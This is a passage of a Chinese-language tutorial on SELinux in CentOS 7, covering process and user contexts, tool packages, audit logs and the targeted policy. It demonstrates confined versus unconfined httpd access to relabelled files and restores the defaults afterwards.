<li>只有一些授权的域才能转换到 <code>passwd_t</code> 域，比如 <code>sendmail</code> 进程运行在 <code>sendmail_t</code> 域中，在该域中它们没有合理的理由和权限执行 <code>passwd</code> 命令，因此就不授予转换到 <code>passwd_t</code> 域的<strong>入口点</strong>；</li>
<li>运行在 <code>passwd_t</code> 域中的进程只对授权的类型具有读写权限，例如标记为 <code>shadow_t</code> 和 <code>etc_t</code> 类型的文件。这就有效阻止了 <code>passwd</code> 命令对其他文件的任意读写权限，从而保证了最小权限运行，最终保证了系统安全。</li>
</ul>
<h3 id="3-3-SELinux-中进程上下文"><a href="#3-3-SELinux-中进程上下文" class="headerlink" title="3.3 SELinux 中进程上下文"></a>3.3 SELinux 中进程上下文</h3><p>前文所述的<strong>上下文</strong>是以<strong>文件上下文</strong>来说的，其实，SELinux机制的实现中，还有<strong>进程上下文</strong>和<strong>用户上下文</strong>，下面分别介绍一下。</p>
<p>前文讲过用命令 <code>ls -Z [file|dir]</code>可以查看<strong>文件上下文</strong>，类似地，用命令 <code>ps -eZ</code> 就可以查看<strong>进程上下文</strong>：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">➜ ps <span class="_">-e</span>Z | more</div><div class="line">LABEL                             PID TTY          TIME CMD</div><div class="line">system_u:system_r:init_t:s0         1 ?        00:00:22 systemd</div><div class="line">system_u:system_r:kernel_t:s0       2 ?        00:00:00 kthreadd</div><div class="line">system_u:system_r:kernel_t:s0       3 ?        00:00:00 ksoftirqd/0</div><div class="line">system_u:system_r:kernel_t:s0       5 ?        00:00:00 kworker/0:0H</div><div class="line">system_u:system_r:kernel_t:s0       7 ?        00:00:00 migration/0</div><div class="line">system_u:system_r:kernel_t:s0       8 ?        00:00:00 rcu_bh</div><div class="line">system_u:system_r:kernel_t:s0       9 ?        00:00:00 rcuob/0</div><div class="line">system_u:system_r:kernel_t:s0      10 ?        00:00:02 rcu_sched</div><div class="line">system_u:system_r:kernel_t:s0      11 ?        00:00:05 rcuos/0</div><div class="line">system_u:system_r:kernel_t:s0      12 ?        00:00:01 watchdog/0</div><div class="line">system_u:system_r:kernel_t:s0      13 ?        00:00:00 khelper</div><div class="line">system_u:system_r:kernel_t:s0      14 ?        00:00:00 kdevtmpfs</div><div class="line">system_u:system_r:kernel_t:s0      15 ?        00:00:00 netns</div><div class="line">system_u:system_r:kernel_t:s0      16 ?        00:00:00 writeback</div><div class="line">system_u:system_r:kernel_t:s0      17 ?        00:00:00 kintegrityd</div><div class="line">system_u:system_r:kernel_t:s0      18 ?        00:00:00 bioset</div><div class="line">system_u:system_r:kernel_t:s0      19 ?        00:00:00 kblockd</div><div class="line">system_u:system_r:kernel_t:s0      20 ?        00:00:00 khubd</div><div class="line">--More--</div></pre></td></tr></table></figure></p>
<h3 id="3-4-SELinux-中用户上下文"><a href="#3-4-SELinux-中用户上下文" class="headerlink" title="3.4 SELinux 中用户上下文"></a>3.4 SELinux 中用户上下文</h3><p>类似地，<code>id -Z</code> 命令可以查看Linux系统用户相关的SELinux上下文信息：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ id -Z</div><div class="line">unconfined_u:unconfined_r:unconfined_t:s0<span class="_">-s</span>0:c0.c1023</div></pre></td></tr></table></figure></p>
<h3 id="4-使用-SELinux-前的准备工作"><a href="#4-使用-SELinux-前的准备工作" class="headerlink" title="4. 使用 SELinux 前的准备工作"></a>4. 使用 SELinux 前的准备工作</h3><hr>
<h3 id="4-1-SELinux-相关的工具"><a href="#4-1-SELinux-相关的工具" class="headerlink" title="4.1 SELinux 相关的工具"></a>4.1 SELinux 相关的工具</h3><p>前文已经使用了 <code>semanage</code> 命令来查看 Linux 系统用户与 SELinux User 之间的映射关系，其实，与 SELinux 相关的工具包与命令工具有好多。安装系统时默认也安装了一些基础的命令工具，但CentOS7 系统如果以最小化的文字模式安装，<code>policycoreutils-python</code> 包和 <code>policycoreutils-gui</code> 包是不会被安装的，里面附带的一些工具也不可用，或者下面列表中其他默认不被安装的工具包，都需要用 <code>yum install [package_name]</code> 来手动安装。下面是常用的工具包及其里面的工具简介：</p>
<ul>
<li><strong>policycoreutils</strong>：提供与 SELinux 相关的命令，比如 <code>restorecon</code>, <code>secon</code>, <code>setfiles</code>, <code>semodule</code> , <code>load_policy</code> 和 <code>setsebool</code> 来操作和管理 SELinux。</li>
<li><strong>policycoreutils-gui</strong>：提供图形化软件 <code>system-config-selinux</code> 来管理 SELinux。</li>
<li><strong>policycoreutils-python</strong>：提供命令比如 <code>semanage</code>, <code>audit2allow</code>, <code>audit2why</code>, 和<br><code>chcat</code> 来管理和操作 SELinux。</li>
<li><strong>selinux-policy</strong>：提供 SELinux 引用策略，该引用策略包括了所有的 SELinux 策略，并被用作其他策略（如 <strong>Targeted Policy</strong>）的基础使用。</li>
<li><strong>selinux-policy-targeted</strong>：提供 SELinux 的 <code>targeted</code> 策略。</li>
<li><strong>selinux-policy-mls</strong>：提供 SELinux 的 <code>MLS</code> 策略。</li>
<li><strong>setroubleshoot-server</strong>：翻译 SELinux 的拒绝操作体质信息，为 <code>sealert</code> 工具提供可以查看的、可读性好的信息。</li>
<li><strong>setools</strong>/<strong>setools-console</strong>/<strong>setools-gui</strong>：这些安装包提供了与 SELinux 相关的策略分析、检索、日志审计与监控、文件上下文管理管理的相关工具。<strong>setools</strong>是<strong>元工具</strong>，<strong>setools-gui</strong>提供了 <code>apol</code>, <code>seaudit</code> 工具；<strong>setool-console</strong> 则提供了 <code>sechecker</code>,<br><code>sediff</code>, <code>seinfo</code>, <code>sesearch</code>, 和 <code>findcon</code> 等命令行工具。</li>
<li><strong>mcstrans</strong>：提供对 SELinux 上文中的<strong>级别</strong>（比如 <code>s0-s0:c0.c1023</code>）翻译的工具。</li>
<li><strong>libselinux</strong>：为 SELinux 的应用提供 API 支持。</li>
<li><strong>libselinux-python</strong>：为 SELinux 应用提供 Python 绑定接口。</li>
<li><strong>libselinux-utils</strong>：提供 <code>avcstat</code>, <code>getenforce</code>, <code>getsebool</code>, <code>matchpathcon</code>,<br><code>selinuxconlist</code>, <code>selinuxdefcon</code>, <code>selinuxenabled</code>, 和 <code>setenforce</code> 工具。</li>
</ul>
<p>上述工具的使用请自行查阅相关资料。</p>
<h3 id="4-2-SELinux-日志"><a href="#4-2-SELinux-日志" class="headerlink" title="4.2 SELinux 日志"></a>4.2 SELinux 日志</h3><p>SELinux 有不止一种日志文件可记录在运行过程中对操作的拒绝日志，以便管理员后续审计与分析。默认情况下，CentOS7 安装了 <code>dbus</code> 和 <code>audit</code> 服务，另外一个有用的 SELinux 日志相关的工具包 <code>setroubleshoot-server</code> 可用命令 <code>yum install setroubleshoot</code> 来安装。</p>
<p>如果 <code>audit</code> 守护进程在运行，SELinux 的拒绝操作日志便会记录在 <code>/var/log/audit/audiut.log</code> 中，内容如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">type=AVC msg=audit(1419246735.232:99): avc:  denied  &#123; getattr &#125; for  pid=3524 comm=&quot;httpd&quot; path=&quot;/var/www/html/info.php&quot; dev=&quot;dm-1&quot; ino=429843 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:samba_share_t:s0 tclass=file</div><div class="line">type=AVC msg=audit(1419246735.232:100): avc:  denied  &#123; getattr &#125; for  pid=3524 comm=&quot;httpd&quot; path=&quot;/var/www/html/info.php&quot; dev=&quot;dm-1&quot; ino=429843 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:samba_share_t:s0 tclass=file</div><div class="line">type=AVC msg=audit(1419246736.440:101): avc:  denied  &#123; unlink &#125; for  pid=11537 comm=&quot;setroubleshootd&quot; name=&quot;setroubleshoot_server&quot; dev=&quot;tmpfs&quot; ino=30142 scontext=system_u:system_r:setroubleshootd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:var_run_t:s0 tclass=sock_file</div></pre></td></tr></table></figure></p>
<p>如果 <code>setroubleshooted</code> 进程在运行的话，上面的记录将会被翻译成可读性好的形式保存到 <code>/var/log/messages</code> 中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">May 7 18: 55: 56 localhost setroubleshoot: SELinux is preventing httpd (httpd_t) &quot;getattr&quot; to /var/www/html/file1 (samba_share_t) . For complete SELinux messages. run sealert -l de7e30d6-5488-466d-a606-92c9f40d316d</div></pre></td></tr></table></figure></p>
<p>当然，不同形式的拒绝操作信息被保存到不同的文件中，是根据不同的守护进程耳钉的，下表列出了对应不同的守护进程的日志文件路径：</p>
<table>
<thead>
<tr>
<th style="text-align:left">守护进程</th>
<th style="text-align:left">日志文件</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>audit</code> [on]</td>
<td style="text-align:left"><strong>/var/log/audit/audit.log</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>audit</code> [off]/<code>rsyslogd</code> [on]</td>
<td style="text-align:left"><strong>/var/log/messages</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>setroubleshooted</code>/<code>rsyslogd</code>/<code>audit</code> [on]</td>
<td style="text-align:left"><strong>/var/log/audit/audit.log</strong> 翻译后存入 <strong>/var/log/messages</strong></td>
</tr>
</tbody>
</table>
<p>至于上述 3 个进程的启动、随系统启动自动启动的设置，请查看 <code>systemd</code> 相关的 <code>systemctl</code> 命令用法。</p>
<h2 id="5-SELinux-目标策略"><a href="#5-SELinux-目标策略" class="headerlink" title="5. SELinux 目标策略"></a>5. SELinux 目标策略</h2><hr>
<p>前文讲了 SELinux 基本的工作原理，主要是对 Linux 系统用户、文件以及进程“标记”上 SELinux 定义的<strong>上下文</strong>，然后根据 SELinux 策略对不同的<strong>上下文元素</strong>进行分域、分等级、分角色和分类控制。</p>
<p>接下来的内容是 SELinux 的第二部分核心内容：<strong>策略</strong> 。SELinux 的策略以配置文件形式存在，并且有不同的策略用于不同的功能。这一部分就以最常用的<strong>目标策略(Targeted Policy)</strong>为例开始讲解 SELinux 中关于 <strong>策略</strong> 的方方面面。</p>
<h3 id="5-1-Targeted-Policy-原理"><a href="#5-1-Targeted-Policy-原理" class="headerlink" title="5.1 Targeted Policy 原理"></a>5.1 Targeted Policy 原理</h3><p>Targeted Policy 是从 <strong>strict</strong> 示例策略衍生而来的，它们结构与组织几乎相同。不同的是 <strong>strict</strong> 策略更趋向于最大化使用 SELinux 所有特性，为大部分程序提供强大的安全保护；而 Targeted Policy 的目标是隔离高风险程序。Targeted Policy 的好处是，一方面可以向 Linux 系统添加大量的安全保护，同时又尽量少影响现有的用户程序。Targeted Policy 的策略主要集中于面向网络的服务（即那些暴露在外容易遭受黑客攻击的组件与服务），Targeted Policy 是 RHEL/Fedora/CentOS 系统上的标准策略，它在增强安全性和减少对现有应用程序影响之间达到了一个很好地平衡。</p>
<p>CentOS7 系统中，Targeted Policy 源文件可以在 <code>/etc/selinux/targeted/src/policy/</code> 目录下找到。</p>
<p>Targeted Policy 中使用了无限制的域类型 <code>unconfined_t</code>，并移除了 <strong>strict</strong> 策略中的 <code>sysadmin_t</code> 和 <code>user_t</code> 域类型，<strong>这也意味着基本的角色结构被移除，所有的用户都以角色 <code>system_r</code> 来运行，几乎所有用户运行的程序都以 <code>unconfined_t</code> 域类型执行</strong>。不过，无限制域和限制域都需要接受可执行和可写的内存检查。默认情况下，运行在无限制域下的<strong>主体</strong>不能分配可写和可执行的内存，这个机制降低了系统遭受缓冲区溢出攻击的风险。这些内存检查可以通过设置SELinux Boolean 变量来关掉，下文详述。</p>
<h3 id="5-2-限制进程"><a href="#5-2-限制进程" class="headerlink" title="5.2 限制进程"></a>5.2 限制进程</h3><p>几乎所有的网络服务进程都在限制下运行；多数以 <code>root</code> 身份运行的系统进程（比如 <code>passwd</code> 进程）都是受限的。当进程受限时，它只能在自己被限制的<strong>域</strong>内运行，只能操作该<strong>域</strong>内的<strong>资源</strong>（文件、服务等），对其他<strong>域</strong>的资源则无权操作。比如 Web 服务进程 <code>httpd</code> 只能运行在 <code>httpd_t</code> 域内。如果一个受限制的进程被黑客攻击并控制，根据 SELinux 策略的配置，该黑客仅仅能访问这个受限制的域，因此攻击所带来的危害也比传统的 Linux 小很多。</p>
<p>以下通过一个具体的例子来演示 SELinux 如何将进程限制在自己的域内运行，本例以Apache服务器的进程 <code>httpd</code> 为例，介绍 SELinux 如何阻止 <code>httpd</code> 进程去访问由其他域管理的文件类型的。</p>
<ol>
<li><p>运行 <code>sestatus</code> 命令来确认 CentOS7 中 SELinux 试运行的，它运行在 <code>enforcing</code> 模式下（SELinux 有3种运行模式，下文详述），且采用了 Targeted Policy：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜ sestatus</div><div class="line">SELinux status:                 enabled</div><div class="line">SELinuxfs mount:                /sys/fs/selinux</div><div class="line">SELinux root directory:         /etc/selinux</div><div class="line">Loaded policy name:             targeted</div><div class="line">Current mode:                   enforcing</div><div class="line">Mode from config file:          enforcing</div><div class="line">Policy MLS status:              enabled</div><div class="line">Policy deny_unknown status:     allowed</div><div class="line">Max kernel policy version:      28</div></pre></td></tr></table></figure>
</li>
<li><p>用 <code>root</code> 权限在 <code>httpd</code> 的工作目录下创建一个新的文件 <code>info.php</code>（显示 PHPINFO 的内容）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ cat /var/www/html/info.php </div><div class="line">&lt;?php</div><div class="line"><span class="built_in">echo</span> phpinfo();</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>查看该文件的 SELinux 上下文信息：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ls -Z /var/www/html/info.php </div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 /var/www/html/info.php</div></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p><strong>NOTE</strong>:<br>至此，可以看出，默认情况下，Linux用户是非限制的，因此刚创建的 <code>info.php</code> 文件的 SELinux 上下文中的<strong>用户</strong>标记为 <code>unconfined_u</code> 。然而<strong>RBAC访问控制机制是作用于进程的，不是用于文件，并且，角色对文件来说也没什么太大意义，因此上述结果中的<code>object_u</code>的角色也仅仅是一个用与文件的通用角色</strong>。在 <code>/proc/</code> 目录下，与进程相关的文件可以采用 <code>system_r</code> <strong>角色</strong>。另外，结果中的 <code>httpd_sys_context_t</code> <strong>类型</strong>允许运行在 <code>httpd_t</code> <strong>域</strong> 中的 <code>httpd</code> 进程访问该文件。</p>
</blockquote>
<ol>
<li>访问 <code>info.php</code> 文件，如下图所示：<br><img src="/imgs/1419231057119.png" alt="Alt text"></li>
</ol>
<p>可知该文件默认是可以被访问到的。</p>
<ol>
<li>使用 <code>chcon</code> 命令对该文件的<strong>类型</strong>重新标识。下面，以 <code>root</code> 用户身份运行如下命令将上述 <code>info.php</code> 文件的<strong>类型</strong>改为可由运行在 <code>samba_share_t</code> <strong>域</strong>内的 Samba 进程访问的文件：<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜ chcon -t samba_share_t info.php</div><div class="line">➜ ls -Z info.php</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:samba_share_t:s0 info.php</div></pre></td></tr></table></figure>
</li>
</ol>
<p>可以看到该文件的<strong>类型</strong>已被改为 <code>samba_share_t</code>，需要注意的是，这种方法的修改是<strong>临时</strong>的，若要永久修改文件的<strong>类型</strong>，需要用 <code>semanage</code> 命令，下文详述。</p>
<ol>
<li>再次访问该 <code>info.php</code> 文件，就会发现被禁止访问了：<br><img src="/imgs/1419231491399.png" alt="Alt text"></li>
</ol>
<p>通过上述几个步骤的演示可知，虽然 Linux 系统基本的 <strong>DAC</strong> 机制允许 <code>httpd</code> 进程访问 <code>info.php</code> 文件，然而 SELinux 实现的 <strong>MAC</strong>机制却进制该访问操作。同时， SELinux 还对这些操作详情记录到日志中，以方便系统管理员事后审计与分析。SELinux 审计日志可查看 <code>/var/log/audit/audit.log</code> 文件：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜ cat /var/<span class="built_in">log</span>/audit/audit.log | grep info.php</div><div class="line"><span class="built_in">type</span>=AVC msg=audit(1419231479.505:13570): avc:  denied  &#123; getattr &#125; <span class="keyword">for</span>  pid=18874 comm=<span class="string">"httpd"</span> path=<span class="string">"/var/www/html/info.php"</span> dev=<span class="string">"dm-1"</span> ino=429843 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:samba_share_t:s0 tclass=file</div><div class="line"><span class="built_in">type</span>=AVC msg=audit(1419231479.505:13571): avc:  denied  &#123; getattr &#125; <span class="keyword">for</span>  pid=18874 comm=<span class="string">"httpd"</span> path=<span class="string">"/var/www/html/info.php"</span> dev=<span class="string">"dm-1"</span> ino=429843 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:samba_share_t:s0 tclass=file</div></pre></td></tr></table></figure></p>
<p>当然，由于该操作涉及 <code>httpd</code> 服务进程，Apache 也有自己的日志文件，因此，也可以查看 Apache 服务器的错误日志文件 <code>/var/log/httpd/error_log</code> :<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ cat /var/<span class="built_in">log</span>/httpd/error_log | grep denied</div><div class="line">[Mon Dec 22 14:57:59.507103 2014] [core:error] [pid 18874] (13)Permission denied: [client 140.254.254.254:57804] AH00035: access to /info.php denied (filesystem path <span class="string">'/var/www/html/info.php'</span>) because search permissions are missing on a component of the path</div></pre></td></tr></table></figure></p>
<h3 id="5-3-非限制进程"><a href="#5-3-非限制进程" class="headerlink" title="5.3 非限制进程"></a>5.3 非限制进程</h3><p>非限制进程运行在<strong>非限制域</strong>中。比如，<code>init</code> 进程运行在非限制的 <code>initrc_t</code> <strong>域</strong> 中，非限制的 Kernel 进程运行在 <code>kernel_t</code> 域中，非限制的用户运行在 <code>unconfined_t</code> 域中。对于非限制的进程， SELinux 的策略规则仍然适用，然而有关允许进程运行在非限制域的规则几乎允许所有的访问。此时，相当于 SELinux 不起作用，SELinux 架起来的防护只相当于“退化”到传统的 DAC机制。如果一个非限制进程被黑客控制，那么 SELinux 将无法阻止黑客进一步活动（当然 DAC 规则仍然适用， SELinux 只是在 DAC 层次上附加了一层更高强度的防护，而不是替代 DAC 机制）。<br>下面将给出一个具体的例子来演示 Apache HTTP 服务器的 <code>httpd</code> 进程在非限制条件下运行时，是如何访问本应由 Samba 服务器访问的数据的。（下面的例子需要安装 SELinux 相关的 <code>setroubleshoot-server</code>、<code>audit</code>等工具包，同上，SELinux 也需要运行在 <code>enforcing</code> 模式下）。</p>
<ol>
<li><p>通过 <code>sestatus</code> 命令检查 SELinux 的运行状态：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜ sestatus</div><div class="line">SELinux status:                 enabled</div><div class="line">SELinuxfs mount:                /sys/fs/selinux</div><div class="line">SELinux root directory:         /etc/selinux</div><div class="line">Loaded policy name:             targeted</div><div class="line">Current mode:                   enforcing</div><div class="line">Mode from config file:          enforcing</div><div class="line">Policy MLS status:              enabled</div><div class="line">Policy deny_unknown status:     allowed</div><div class="line">Max kernel policy version:      28</div></pre></td></tr></table></figure>
</li>
<li><p>确保上述的 <code>info.php</code> 文件 SELinux 上下文中的<strong>类型</strong>仍然是 <code>samba_share_t</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ls -Z</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:samba_share_t:s0 info.php</div></pre></td></tr></table></figure>
</li>
<li><p><code>httpd</code> 进程原来运行在<strong>受限制</strong> 的 <code>httpd_t</code> <strong>域</strong> 内，其进程启动文件 <code>/usr/sbin/httpd</code> 的文件类型为 <code>httpd_exec_t</code> :</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜ ls -Z /usr/sbin/httpd</div><div class="line">-rwxr-xr-x. root root system_u:object_r:httpd_exec_t:s0 /usr/sbin/httpd</div><div class="line">➜ </div><div class="line">➜ ps <span class="_">-e</span>Z | grep httpd </div><div class="line">system_u:unconfined_r:httpd_t:s0 23284 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:httpd_t:s0 23286 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:httpd_t:s0 23287 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:httpd_t:s0 23288 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:httpd_t:s0 23289 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:httpd_t:s0 23290 ?  00:00:00 httpd</div></pre></td></tr></table></figure>
</li>
<li><p>在将 <code>httpd</code> 进程从 <strong>限制</strong> 改为 <strong>非限制</strong> 之前，需要先终止该进程：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜ systemctl stop httpd.service</div></pre></td></tr></table></figure>
</li>
<li><p>以 <code>root</code> 用户身份运行以下命令来改变 <code>httpd</code> 进程启动命令文件的 <strong>类型</strong>，以确保其启动之后不运行在原来的 <code>httpd_t</code> <strong>域</strong> 内（将 <code>/usr/sbin/httpd</code> 的 <strong>类型</strong> 改为 <code>unconfined_exec_t</code> ，启动后进程将运行在 <code>unconfind_t</code> <strong>非限制域</strong> 内）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">➜ chcon -t unconfined_exec_t /usr/sbin/httpd</div><div class="line">➜ ls -Z /usr/sbin/httpd </div><div class="line">-rwxr-xr-x. root root system_u:object_r:unconfined_exec_t:s0 /usr/sbin/httpd</div><div class="line">➜ </div><div class="line">➜ systemctl start httpd.service</div><div class="line">➜ ps <span class="_">-e</span>Z | grep httpd </div><div class="line">system_u:unconfined_r:unconfined_t:s0 23284 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:unconfined_t:s0 23286 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:unconfined_t:s0 23287 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:unconfined_t:s0 23288 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:unconfined_t:s0 23289 ?  00:00:00 httpd</div><div class="line">system_u:unconfined_r:unconfined_t:s0 23290 ?  00:00:00 httpd</div></pre></td></tr></table></figure>
</li>
<li><p>此时，用运行在 <strong>非限制域</strong> 内的 <code>httpd</code> 进程访问本来只能由 Samba 进程访问的、类型为 <code>samba_share_t</code>的 <code>info.php</code>文件：<br><img src="/imgs/1419236983990.png" alt="Alt text"><br>该结果显示，虽然 <code>httpd</code> 进程原来没有访问标记为 <code>samba_share_t</code> <strong>类型</strong>的文件的权限，然而由于 <code>httpd</code> 现在运行在<strong>非限制域</strong> <code>unconfined_t</code> 中，所以 SELinux 的防护策略没起作用，相当于只有 Linux 系统的 DAC 机制起作用。</p>
</li>
<li>测试结束后，可以用 <code>restorecon</code> 命令来恢复文件的<strong>默认类型</strong>，下面依次恢复上述测试中的两个文件的默认类型，并重新启动相关进程：<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">➜ restorecon -v /var/www/html/info.php</div><div class="line">restorecon reset /var/www/html/info.php context unconfined_u:object_r:samba_share_t:s0-&gt;unconfined_u:object_r:httpd_sys_content_t:s0</div><div class="line">➜ ls -Z /var/www/html/info.php </div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 /var/www/html/info.php</div><div class="line">➜ </div><div class="line">➜ systemctl stop httpd.service</div><div class="line">➜ restorecon -v /usr/sbin/httpd</div><div class="line">restorecon reset /usr/sbin/httpd context system_u:object_r:unconfined_exec_t:s0-&gt;system_u:object_r:httpd_exec_t:s0</div><div class="line">➜ systemctl start httpd.service </div><div class="line">➜ ps <span class="_">-e</span>Z | grep httpd</div><div class="line">system_u:system_r:httpd_t:s0    24479 ?        00:00:00 httpd</div><div class="line">system_u:system_r:httpd_t:s0    24481 ?        00:00:00 httpd</div><div class="line">system_u:system_r:httpd_t:s0    24482 ?        00:00:00 httpd</div><div class="line">system_u:system_r:httpd_t:s0    24483 ?        00:00:00 httpd</div><div class="line">system_u:system_r:httpd_t:s0    24484 ?        00:00:00 httpd</div><div class="line">system_u:system_r:httpd_t:s0    24485 ?        00:00:00 httpd</div></pre></td></tr></table></figure>
</li>
</ol>
<p>上述步骤演示了 SELinux 如果通过限制进程的运行来保证 Linux 系统安全的，也演示了如果将重要进程改为<strong>非限制进程</strong>的安全隐患，因此，将一个进程的运行状态由<strong>限制</strong>改为<strong>非限制</strong>的时候，应当十分慎重。</p>
<h4 id="3-4-4-限制和非限制用户"><a href="#3-4-4-限制和非限制用户" class="headerlink" title="3.4.4 限制和非限制用户"></a>3.4.4 限制和非限制用户</h4><p>前文介绍过，每个 Linux 系统用户在 SELinux 中都被映射为一个 SELinux User，这使得 Linux 用户能够继承在 SELinux 实现的 SELinux User 访问控制。用 <code>semanage login -l</code> 查看两种用户间的映射情况：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜ semanage login <span class="_">-l</span></div><div class="line"></div><div class="line">登录名                SELinux 用户          MLS/MCS 范围          服务</div><div class="line"></div><div class="line">__default__          unconfined_u         s0<span class="_">-s</span>0:c0.c1023        *</div><div class="line">root                 unconfined_u         s0<span class="_">-s</span>0:c0.c1023        *</div><div class="line">system_u             system_u             s0<span class="_">-s</span>0:c0.c1023        *</div></pre></td></tr></table></figure></p>
<p>CentOS7 中，Linux 用户被默认映射到 SELinux 的 <code>__default__</code> login 中，从而映射为 <code>unconfined_u</code> <strong>类型</strong>。下面通过一个具体的在 CentOS7 中添加新用户的例子，来掩饰 SELinux 是如何映射 Linux 系统用户的。</p>
<ol>
<li><p>以 <code>root</code> 用户身份，运行 <code>useradd</code> 命令新增用户 <code>jiayu</code> ，并用<code>passwd</code> 命令给新用户设置密码：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ useradd jiayu</div><div class="line">➜ passwd jiayu</div></pre></td></tr></table></figure>
</li>
<li><p>用<code>su jiayu</code> 命令切换到用户 <code>jiayu</code> 登录 Shell，并用 <code>id -Z</code> 命令查看该用户的 SELinux 上下文：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜ su jiayu</div><div class="line">[jiayu@localhost ~]$ id -Z</div><div class="line">unconfined_u:unconfined_r:unconfined_t:s0<span class="_">-s</span>0:c0.c1023</div></pre></td></tr></table></figure>
</li>
</ol>
<p>由上面步骤可以看到，当 Linux 添加一个新用户时， SELinux 默认将该<strong>用户</strong>映射为 <code>unconfined_u</code> 类型，<strong>角色</strong> 为 <code>unconfined_r</code>，<strong>域</strong> 为 <code>unconfined_t</code>。</p>
<p><strong>限制和非限制的用户都需要接受可执行和可写的内存检查，并接受 MCS（Multi-Category Security） 与 MLS（Multi-Level Security）机制的约束</strong>。如果一个非限制用户执行了一个从 <code>unconfined_t</code>域向一个允许的域转变的应用程序，非限制用户仍要接受那个转变到的域的限制。<strong>这个机制就保证了即使一个用户是非限制的，这个应用也是受限的</strong>，因此，软件的漏洞引起的风险仍能得到一定程度的控制。</p>
